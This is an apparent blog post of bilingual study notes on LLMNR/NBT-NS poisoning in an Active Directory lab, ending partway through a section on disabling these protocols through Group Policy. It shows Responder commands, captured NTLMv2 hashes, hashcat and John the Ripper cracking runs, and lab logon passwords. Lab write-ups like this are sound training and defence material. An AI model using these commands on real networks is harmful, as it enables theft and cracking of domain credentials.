@@ -1,0 +1,764 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>AD - Initial Attack Vectors | HackThe4O4</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Attacking Active Directory: Initial Attack Vectors Initial AD Attack Vectors攻擊者在網路上植入裝置或將工具上傳到受感染的主機 https:&#x2F;&#x2F;notes.benheater.com&#x2F;books&#x2F;active-directory&#x2F;chapter&#x2F;initial-attack-vectors LLMNR Poisoning O">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AD - Initial Attack Vectors">
+<meta property="og:url" content="https://no-flag.com/2024/12/21/Attacking%20Active%20Directory%20Initial%20Attack%20Vectors/index.html">
+<meta property="og:site_name" content="HackThe4O4">
+<meta property="og:description" content="Attacking Active Directory: Initial Attack Vectors Initial AD Attack Vectors攻擊者在網路上植入裝置或將工具上傳到受感染的主機 https:&#x2F;&#x2F;notes.benheater.com&#x2F;books&#x2F;active-directory&#x2F;chapter&#x2F;initial-attack-vectors LLMNR Poisoning O">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_1.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_2.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_3.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_4.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_5.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_6.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_7.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_8.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_9.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_10.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_11.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_12.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_13.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_14.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_15.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_16.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_17.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_18.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_19.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_20.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_21.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_22.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_23.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_24.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_25.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_26.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_27.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_28.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_29.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_30.png">
+<meta property="og:image" content="https://no-flag.com/img/ADInitial_Untitled_31.png">
+<meta property="article:published_time" content="2024-12-21T12:32:07.071Z">
+<meta property="article:modified_time" content="2024-03-04T17:07:39.206Z">
+<meta property="article:author" content="Noflag">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://no-flag.com/img/ADInitial_Untitled.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+	<!-- If needed, replace your own web font service -->
+  <link href="https://fonts.googleapis.com/css?family=Crimson+Text:400,700|Inconsolata|Oswald" rel="stylesheet" />
+
+  
+   
+  
+<link rel="stylesheet" href="/icomoon/style.css">
+
+  
+<link rel="stylesheet" href="/style.css">
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div class="site-wrapper is_post_page">
+    <div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+<script>document.getElementById("loading-bar").style.width="20%";</script>
+
+
+<header id="header" class="site-header clearfix">
+
+  <a class="logo square clearfix" href="/">
+    <!-- 
+      Replace with your own size name, for example:
+      <span class="b">A</span>
+      <span class="w">B</span>
+      <span class="b">C</span>
+     -->
+     <span class="b">A</span>
+     <span class="b">R</span>
+     <span class="b">T</span>
+     <span class="w">I</span>
+     <span class="w">F</span>
+     <span class="b">A</span>
+     <span class="b">C</span>
+     <span class="b">T</span>
+  </a>
+  <a class="me square site-nav-switch clearfix">
+    <span class="b">
+    	<span class="icon icon-menu"></span>
+    </span>
+  </a>
+
+</header>
+
+    <script>document.getElementById("loading-bar").style.width="40%";</script>
+    <main id="main" class="clearfix">
+      <article id="post-Attacking Active Directory Initial Attack Vectors"
+  class="article white-box article-type-post"
+  itemscope itemprop="blogPost">
+
+  <header class="article-header">
+    <h1 class="article-title" itemprop="name">
+      AD - Initial Attack Vectors
+    </h1>
+    <div class="article-meta">
+      Posted on 
+      <time class="article-time" datetime="2024-12-21T12:32:07.071Z" itemprop="datePublished">
+        Dec 21, 2024
+      </time>
+    </div>
+  </header>
+
+  <div class="article-entry" itemprop="articleBody">
+    <h1 id="Attacking-Active-Directory-Initial-Attack-Vectors"><a href="#Attacking-Active-Directory-Initial-Attack-Vectors" class="headerlink" title="Attacking Active Directory: Initial Attack Vectors"></a>Attacking Active Directory: Initial Attack Vectors</h1><hr>
+<h3 id="Initial-AD-Attack-Vectors"><a href="#Initial-AD-Attack-Vectors" class="headerlink" title="Initial AD Attack Vectors"></a>Initial AD Attack Vectors</h3><p>攻擊者在網路上植入裝置或將工具上傳到受感染的主機</p>
+<p><a target="_blank" rel="noopener" href="https://notes.benheater.com/books/active-directory/chapter/initial-attack-vectors">https://notes.benheater.com/books/active-directory/chapter/initial-attack-vectors</a></p>
+<h2 id="LLMNR-Poisoning-Overview"><a href="#LLMNR-Poisoning-Overview" class="headerlink" title="LLMNR Poisoning Overview"></a><strong>LLMNR Poisoning Overview</strong></h2><h3 id="What-is-LLMNR"><a href="#What-is-LLMNR" class="headerlink" title="What is LLMNR?"></a>What is LLMNR?</h3><p><a target="_blank" rel="noopener" href="https://systemweakness.com/what-is-llmnr-poisoning-attack-and-how-to-secure-against-it-417f3b415e51">https://systemweakness.com/what-is-llmnr-poisoning-attack-and-how-to-secure-against-it-417f3b415e51</a></p>
+<p><a target="_blank" rel="noopener" href="https://stridergearhead.medium.com/llmnr-poisoning-an-ad-attack-1265f5365332">https://stridergearhead.medium.com/llmnr-poisoning-an-ad-attack-1265f5365332</a></p>
+<ul>
+<li>Used to identify hosts when DNS fails to do so</li>
+<li>Linux 系統通過systemd實現該協議，通過5355端口進行通訊</li>
+<li>IPV4 、IPV6通過此協議對同一本地鍊路上的主機執行名稱解析</li>
+<li>Windows 用來在網路中 DNS 請求失敗時將主機名稱解析為 IP 位址的兩種名稱服務</li>
+<li>用於在 DNS 無法識別主機時識別主機</li>
+<li>Previously NBT-NS</li>
+<li>主要缺陷是，服務在適當回應時會利用使用者的使用者名稱和 NTLMv2 雜湊值</li>
+<li>一台電腦嘗試解析特定主機而 DNS 無法解析，則該電腦將使用 LLMNR 與網路中的其他電腦進行通信，並詢問是否有人知道該特定主機</li>
+<li>它將請求廣播到連接到本地網路的每個系統</li>
+<li>如果本地網路上有任何受感染的機器，預設情況下它也會收到主機查詢請求，並且受感染的機器也可以將回應傳送到受害機器。反過來，詢問受害者的密碼雜湊值</li>
+</ul>
+<p><img src="/img/ADInitial_Untitled.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_1.png" alt="Untitled"></p>
+<h3 id="Run-Responder"><a href="#Run-Responder" class="headerlink" title="Run Responder"></a>Run Responder</h3><p><a target="_blank" rel="noopener" href="https://www.kali.org/tools/responder/">https://www.kali.org/tools/responder/</a></p>
+<ul>
+<li>基本協議 鏈路本地多播名稱解析 <code>LLMNR</code>、名稱伺服器 <code>NBNS</code>、協議和多播 <code>MDNS</code> - Windows 默認開啟<ul>
+<li>如果Hosts檔案裡面不存在，就會使用DNS解析。如果DNS解析失敗，就會使用LLMNR解析；如果LLMNR解析失敗，就會使用NBNS解析<ul>
+<li>Hosts &gt;DNS (cache &#x2F; server)&gt;LLMNR&gt;NBNS</li>
+<li>LLMNR - UDP&#x2F;5355</li>
+</ul>
+</li>
+<li>NetBIOS在WindowsNT以後的所有作業系統上均可使用，而只有WindowsVista和更高版本才支援LLMNR</li>
+<li>主要作用都是在 DNS 伺服器解析失敗後，嘗試對 windows 主機名稱進行解析</li>
+<li>正因為預設啟用、且實作方式又類似於ARP 協議，並沒有一個認證的過程，所以就會引發各種基於這兩種協議的欺騙行為</li>
+<li>Responder 正是透過這種方式，欺騙受害機器，並使受害機器在後續認證中發送其憑證</li>
+</ul>
+</li>
+<li>不用透過漏洞利用來取得權限的一種方法</li>
+<li>透過監聽網絡 &gt; 他人訪問虛假的共享文件地址 &gt; 獲得系統登錄口令的哈希值 &gt;  通過腳本進行hash爆破就可以獲得口令 &gt; 通過ipc建立空連接獲得系統權限</li>
+<li>windows 基於NTLM 認證的有SMB、HTTP、LDAP、MSSQL 等，responder 可以透過模擬正常的SMB 協定而獲得受害機器的NTLMV2 hash 值</li>
+<li>NTLM v2 不能直接應用於Pass The Hash 攻擊，只能透過暴力破解來取得明文密碼</li>
+<li>攻擊者取得 NTLMv1 hash 後，可以直接還原出 NTLM HASH，這樣的話就可以將 NTLM HASH 直接用於 Pass The Hash 攻擊</li>
+<li>“協定欺騙”+“模擬服務”，先透過 NBNS、LLMNR 或 MDNS 協定進行欺騙，將流量轉到本機，再透過服務互動來取得 hash 值</li>
+<li>攻擊者可以直接通過LM Hash和NTLM Hash訪問遠程主機或服務，而不用提供明文密碼</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> responder -I tun0 -dwP</span><br><span class="line"><span class="comment"># -I 指定網卡</span></span><br><span class="line"><span class="comment"># -d 啟用Debug模式，輸出更詳細調試訊息</span></span><br><span class="line"><span class="comment"># -w 指定启用WPAD代理服务器功能，使得Responder会回复客户端的WPAD请求，从而尝试获取客户端的凭据。</span></span><br><span class="line"><span class="comment"># -P 啟用HTTP回復功能，允許Responder再收到NTLM時回復HTTP 401 Unauthorized回應，從而嘗試獲取用戶憑據</span></span><br><span class="line"><span class="comment"># -v Increase verbosity 沒開啟可能沒法captured hash</span></span><br></pre></td></tr></table></figure>
+
+<p>wpad中間人攻擊 : <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1871187">https://cloud.tencent.com/developer/article/1871187</a></p>
+<h2 id="Capturing-Hashes-with-Responder"><a href="#Capturing-Hashes-with-Responder" class="headerlink" title="Capturing Hashes with Responder"></a><strong>Capturing Hashes with Responder</strong></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **responder -I eth0 -dwv</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"><span class="comment">#確認服務開啟狀況**</span></span><br><span class="line">[+] Servers:</span><br><span class="line">    **HTTP server                [ON]**</span><br><span class="line">    HTTPS server               [ON]</span><br><span class="line">    WPAD proxy                 [ON]</span><br><span class="line">    Auth proxy                 [OFF]</span><br><span class="line">    **SMB server                 [ON]**</span><br><span class="line">    Kerberos server            [ON]</span><br><span class="line">    SQL server                 [ON]</span><br><span class="line">    FTP server                 [ON]</span><br><span class="line">    IMAP server                [ON]</span><br><span class="line">    POP3 server                [ON]</span><br><span class="line">    SMTP server                [ON]</span><br><span class="line">    DNS server                 [ON]</span><br><span class="line">    LDAP server                [ON]</span><br><span class="line">    MQTT server                [ON]</span><br><span class="line">    RDP server                 [ON]</span><br><span class="line">    DCE-RPC server             [ON]</span><br><span class="line">    WinRM server               [ON]</span><br><span class="line">    SNMP server                [OFF]</span><br><span class="line">**#確認在對的網卡上運行**</span><br><span class="line">[+] Generic Options:</span><br><span class="line">    Responder NIC              [eth0]</span><br><span class="line">    Responder IP               [192.168.19.130]</span><br><span class="line">    Responder IPv6             [fe80::20c:29ff:fe76:7735]</span><br><span class="line">    Challenge <span class="built_in">set</span>              [random]</span><br><span class="line">    Don<span class="string">&#x27;t Respond To Names     [&#x27;</span>ISATAP<span class="string">&#x27;, &#x27;</span>ISATAP.LOCAL<span class="string">&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Current Session Variables:</span></span><br><span class="line"><span class="string">    Responder Machine Name     [WIN-2YV65QKNUWI]</span></span><br><span class="line"><span class="string">    Responder Domain Name      [1LBD.LOCAL]</span></span><br><span class="line"><span class="string">    Responder DCE-RPC Port     [49457]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Listening for events...                                                                                                                      </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[PROXY] Received connection from 192.168.19.1</span></span><br><span class="line"><span class="string">[PROXY] Returning unmodified HTTP response</span></span><br><span class="line"><span class="string">[PROXY] Returning unmodified HTTP response</span></span><br><span class="line"><span class="string">[PROXY] Returning unmodified HTTP response</span></span><br><span class="line"><span class="string">[*] [DHCP] Found DHCP server IP: 192.168.19.254, now waiting for incoming requests...</span></span><br></pre></td></tr></table></figure>
+
+<p>getting some events occurring </p>
+<ul>
+<li>simulate an event occuring</li>
+<li>generate some of LLMR traffic - fake it - attack</li>
+</ul>
+<p>Go to THEPUNISHER-2 VM login the </p>
+<ul>
+<li>logon name - fcastle</li>
+<li>passwd - Akali@@</li>
+</ul>
+<p>when we get loggin here, going to explore and navigate to attacker IP address</p>
+<p><img src="/img/ADInitial_Untitled_2.png" alt="Untitled"></p>
+<p>輸入後kali的responder會captured hashes - NTLMv2 hash</p>
+<ul>
+<li>can see what IP address came from</li>
+</ul>
+<p><img src="/img/ADInitial_Untitled_3.png" alt="Untitled"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">....</span><br><span class="line">[PROXY] Returning unmodified HTTP response</span><br><span class="line">[SMB] NTLMv2-SSP Client   : **192.168.19.149**</span><br><span class="line">[SMB] NTLMv2-SSP Username : MARVEL\fcastle</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : **fcastle::MARVEL:1c279671420f45c3:DEDDBB842C3D7AD7F911F8345A97C415:010100000000000000DA75D2C162DA015F83122A885FB6290000000002000800420044003700490001001E00570049004E002D004800550056004200370059005000430054004F00460004003400570049004E002D004800550056004200370059005000430054004F0046002E0042004400370049002E004C004F00430041004C000300140042004400370049002E004C004F00430041004C000500140042004400370049002E004C004F00430041004C000700080000DA75D2C162DA0106000400020000000800300030000000000000000100000000200000436D69EED3EB5B35E7DC93EEFEF7628B4ED7CF218E8932D5B2B957767139D9F90A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00310039002E003100330030000000000000000000**                                                                                                                                        </span><br><span class="line">[SMB] NTLMv2-SSP Client   : 192.168.19.149</span><br><span class="line">[SMB] NTLMv2-SSP Username : MARVEL\fcastle</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:0fb699ba875964a8:2C4B513447026AB49B757D8A4E41B1D3:010100000000000000DA75D2C162DA01DB87411B07EA9AE30000000002000800420044003700490001001E00570049004E002D004800550056004200370059005000430054004F00460004003400570049004E002D004800550056004200370059005000430054004F0046002E0042004400370049002E004C004F00430041004C000300140042004400370049002E004C004F00430041004C000500140042004400370049002E004C004F00430041004C000700080000DA75D2C162DA0106000400020000000800300030000000000000000100000000200000436D69EED3EB5B35E7DC93EEFEF7628B4ED7CF218E8932D5B2B957767139D9F90A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00310039002E003100330030000000000000000000                                                                                                                                        </span><br><span class="line">[SMB] NTLMv2-SSP Client   : 192.168.19.149</span><br><span class="line">[SMB] NTLMv2-SSP Username : MARVEL\fcastle</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:75ac5d61d0467955:3803152E929D39CC9C21EC574086B8C7:010100000000000000DA75D2C162DA010A1F43A5E34B5A780000000002000800420044003700490001001E00570049004E002D004800550056004200370059005000430054004F00460004003400570049004E002D004800550056004200370059005000430054004F0046002E0042004400370049002E004C004F00430041004C000300140042004400370049002E004C004F00430041004C000500140042004400370049002E004C004F00430041004C000700080000DA75D2C162DA0106000400020000000800300030000000000000000100000000200000436D69EED3EB5B35E7DC93EEFEF7628B4ED7CF218E8932D5B2B957767139D9F90A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00310039002E003100330030000000000000000000                                                                                                                                        </span><br><span class="line">[SMB] NTLMv2-SSP Client   : 192.168.19.149</span><br><span class="line">[SMB] NTLMv2-SSP Username : MARVEL\fcastle</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:a462b96d5ffe3f59:B045571CC58C7B5B73FA788498602F61:010100000000000000DA75D2C162DA01D7E4E1A6E08A7AB90000000002000800420044003700490001001E00570049004E002D004800550056004200370059005000430054004F00460004003400570049004E002D004800550056004200370059005000430054004F0046002E0042004400370049002E004C004F00430041004C000300140042004400370049002E004C004F00430041004C000500140042004400370049002E004C004F00430041004C000700080000DA75D2C162DA0106000400020000000800300030000000000000000100000000200000436D69EED3EB5B35E7DC93EEFEF7628B4ED7CF218E8932D5B2B957767139D9F90A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00310039002E003100330030000000000000000000</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>If passwd is weak, we can actually take this hash and crack </p>
+<h3 id="Cracking-Our-Captured-Hashes"><a href="#Cracking-Our-Captured-Hashes" class="headerlink" title="Cracking Our Captured Hashes"></a><strong>Cracking Our Captured Hashes</strong></h3><p>將hash存到檔案中</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nano hash.txt                 </span><br><span class="line">                                                                                                                                                 </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# <span class="built_in">cat</span> hash.txt  </span><br><span class="line">fcastle::MARVEL:a462b96d5ffe3f59:B045571CC58C7B5B73FA788498602F61:010100000000000000DA75D2C162DA01D7E4E1A6E08A7AB90000000002000800420044003700490001001E00570049004E002D004800550056004200370059005000430054004F00460004003400570049004E002D004800550056004200370059005000430054004F0046002E0042004400370049002E004C004F00430041004C000300140042004400370049002E004C004F00430041004C000500140042004400370049002E004C004F00430041004C000700080000DA75D2C162DA0106000400020000000800300030000000000000000100000000200000436D69EED3EB5B35E7DC93EEFEF7628B4ED7CF218E8932D5B2B957767139D9F90A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00310039002E003100330030000000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>Going to attempt to crack hash</p>
+<p>using a tool <code>hashcat</code> or <code>john the ripper</code> </p>
+<ul>
+<li>hashcat<ul>
+<li>破解速度快</li>
+<li>經過最佳化</li>
+<li>密碼恢復工具，也可以用於安全測試（例如密碼破解、暴露缺陷）</li>
+<li>提供了多種破解模式，包括暴力破解、字典、組合、混合和遮罩攻擊等</li>
+<li>能夠一次爆破多組雜湊值，在同個系統裡不同裝置上運作。</li>
+</ul>
+</li>
+<li>john the ripper<ul>
+<li>識別和處理各種hash格式的能力</li>
+<li>自動偵測hash類型</li>
+<li>擅長處理更複雜或不常見的雜湊格式</li>
+<li>用於尋找和破解弱密碼</li>
+</ul>
+</li>
+</ul>
+<p>這邊選擇hashcat</p>
+<ul>
+<li><code>-m</code>指定輸入要爆破密碼的值為哪種加密格式， <code>5600</code> 為NTLMv2的雜湊演算法</li>
+<li>最常見的雜湊方式為MD5，如果是要破解此演算法輸入<code>-m 0</code></li>
+<li>要選擇其他雜湊可以 <code>hashcat --help</code> 選擇左側編號</li>
+</ul>
+<p><img src="/img/ADInitial_Untitled_4.png" alt="Untitled"></p>
+<ul>
+<li><code>-a</code>指定哪種爆破模式，0:直接字典破解 1:組合破解 3:暴力破解，</li>
+</ul>
+<p>Here can see what are the modules here for NTLM</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **hashcat --<span class="built_in">help</span> | grep NTLM**</span><br><span class="line">   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol</span><br><span class="line">  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol</span><br><span class="line">   **5600 | NetNTLMv2**                                                  | Network Protocol</span><br><span class="line">  27100 | NetNTLMv2 (NT)                                             | Network Protocol</span><br><span class="line">   1000 | NTLM</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt**</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">Password1        (fcastle)     </span><br><span class="line">1g 0:00:00:00 DONE (2024-02-19 02:48) 50.00g/s 204800p/s 204800c/s 204800C/s paris..soccer8</span><br><span class="line">Use the <span class="string">&quot;--show --format=netntlmv2&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force</span><br><span class="line"><span class="comment">#或是使用這條指令將密碼輸出到指定文件</span></span><br><span class="line"><span class="comment">#hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show -o cra.txt</span></span><br><span class="line"><span class="comment"># -O 加速破解**</span></span><br><span class="line">hashcat (v6.2.6) starting</span><br><span class="line"></span><br><span class="line">You have enabled --force to bypass dangerous warnings and errors!</span><br><span class="line">This can hide serious problems and should only be <span class="keyword">done</span> when debugging.</span><br><span class="line">Do not report hashcat issues encountered when using --force.</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="comment">#1 [The pocl project]</span></span><br><span class="line">==================================================================================================================================================</span><br><span class="line">* Device <span class="comment">#1: cpu-haswell-AMD Ryzen 7 4800H with Radeon Graphics, 2901/5866 MB (1024 MB allocatable), 4MCU</span></span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Not-Iterated</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) backend kernels selected.</span><br><span class="line">Pure kernels can crack longer passwords, but drastically reduce performance.</span><br><span class="line">If you want to switch to optimized kernels, append -O to your commandline.</span><br><span class="line">See the above message to find out about the exact limits.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line"></span><br><span class="line">Host memory required <span class="keyword">for</span> this attack: 1 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344394</span><br><span class="line">* Bytes.....: 139921559</span><br><span class="line">* Keyspace..: 14344394</span><br><span class="line"></span><br><span class="line">FCASTLE::MARVEL:bfafc4dcd07cc85c:ee3d25fd4dea961e4c49b0696986ed33:0101000000000000005a17d6dd62da0131f6f69cc44da89800000000020008004b0043004c00320001001e00570049004e002d00330046004800360057004f005100360050003100570004003400570049004e002d00330046004800360057004f00510036005000310057002e004b0043004c0032002e004c004f00430041004c00030014004b0043004c0032002e004c004f00430041004c00050014004b0043004c0032002e004c004f00430041004c0007000800005a17d6dd62da0106000400020000000800300030000000000000000100000000200000436d69eed3eb5b35e7dc93eefef7628b4ed7cf218e8932d5b2b957767139d9f90a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00310039002e003100330030000000000000000000:**Password1**</span><br><span class="line">                                                          </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 5600 (NetNTLMv2)</span><br><span class="line">Hash.Target......: FCASTLE::MARVEL:bfafc4dcd07cc85c:ee3d25fd4dea961e4c...000000</span><br><span class="line">Time.Started.....: Mon Feb 19 02:48:25 2024, (0 secs)</span><br><span class="line">Time.Estimated...: Mon Feb 19 02:48:25 2024, (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.#1.........:   493.8 kH/s (0.97ms) @ Accel:512 Loops:1 Thr:1 Vec:8</span><br><span class="line">Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)</span><br><span class="line">Progress.........: 4096/14344394 (0.03%) <span class="comment">#花了多少比例才找到這密碼</span></span><br><span class="line">Rejected.........: 0/4096 (0.00%)</span><br><span class="line">Restore.Point....: 2048/14344394 (0.01%)</span><br><span class="line">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.#1....: paris -&gt; soccer8</span><br><span class="line">Hardware.Mon.#1..: Util: 26%</span><br><span class="line"></span><br><span class="line">Started: Mon Feb 19 02:48:22 2024</span><br><span class="line">Stopped: Mon Feb 19 02:48:27 2024</span><br></pre></td></tr></table></figure>
+
+<h2 id="LLMNR-Poisoning-Mitigation"><a href="#LLMNR-Poisoning-Mitigation" class="headerlink" title="LLMNR Poisoning Mitigation"></a><strong>LLMNR Poisoning Mitigation</strong></h2><p>補救及緩解措施 &gt; <strong>主要防禦 – 停用 LLMNR 和 NBT-NS</strong></p>
+<p>LLMNR是一種協議，允許 IPv4 和 IPv6 主機對同一本機網路上的主機執行名稱解析，而無需 DNS 伺服器或 DNS 配置</p>
+<p>當主機的 DNS 查詢失敗（即 DNS 伺服器不知道名稱）時，主機會在本地網路上廣播 LLMNR 請求，以查看是否有其他主機可以回應。</p>
+<p>LLMNR 沒有身份驗證機制。  任何人都可以回應 LLMNR 請求</p>
+<p>要透過 GPO 停用 NBT-NS，我們只需編寫一個 PowerShell 腳本並將其保存在啟動腳本中。</p>
+<p>add the script to Startup Scripts in <strong>Computer Configuration &gt; Policies &gt; Windows Settings &gt; Scripts &gt; Startup</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces\tcpip* -Name NetbiosOptions -Value 2**</span><br></pre></td></tr></table></figure>
+
+<p>The best defense in this case is to disable LLMNR and NBT-NS.<br>● To disable LLMNR, select “Turn OFF Multicast Name Resolution” under Local Computer Policy &gt; Computer Configuration &gt; Administrative Templates &gt; Network &gt; DNS Client in the Group Policy Editor.</p>
+<ul>
+<li><strong>若要停用 NBT-NS，請導覽至網路連線 &gt; 網路介面卡屬性 &gt; TCP&#x2F;IPv4 屬性 &gt; 進階選項卡 &gt; WINS 選項卡，然後選擇「停用 TCP&#x2F;IP 上的 NetBIOS」。這僅適用於本地</strong></li>
+</ul>
+<p><img src="/img/ADInitial_Untitled_5.png" alt="Untitled"></p>
+<p>If a company must use or cannot disable LLMNR&#x2F;NBT-NS,the best course of action is to:</p>
+<ul>
+<li><p>Require Network Access Control.</p>
+<ul>
+<li>Example : 將設備聯網，不應該讓他很輕鬆就直接連到網路，而是這中間應該要有些權限設置、要求用戶設置設備訪問密碼，降低破解機率</li>
+</ul>
+</li>
+<li><p><strong>• 需要強用戶密碼（例如，長度&gt;14 個字元並限制常用單字的使用）。密碼越複雜、越長，攻擊者就越難破解雜湊值。</strong></p>
+</li>
+<li><p>可以利用它而不是關閉元素LLMNR</p>
+</li>
+<li><p>Group Policy Managemnet → Forest.. → Domain → Default Domain Police → Edit</p>
+</li>
+</ul>
+<p>Policies → Administrative… → Network → DNS Client → turn off multicast → Enable</p>
+<p><img src="/img/ADInitial_Untitled_6.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_7.png" alt="Untitled"></p>
+<p><img src="/img/ADInitial_Untitled_8.png" alt="Untitled"></p>
+<h3 id="確認緩解措施"><a href="#確認緩解措施" class="headerlink" title="確認緩解措施"></a><strong>確認緩解措施</strong></h3><p><strong>我們可以透過在 PowerShell 中執行以下命令並收到「0」返回來確認我們已緩解 LLMNR：</strong></p>
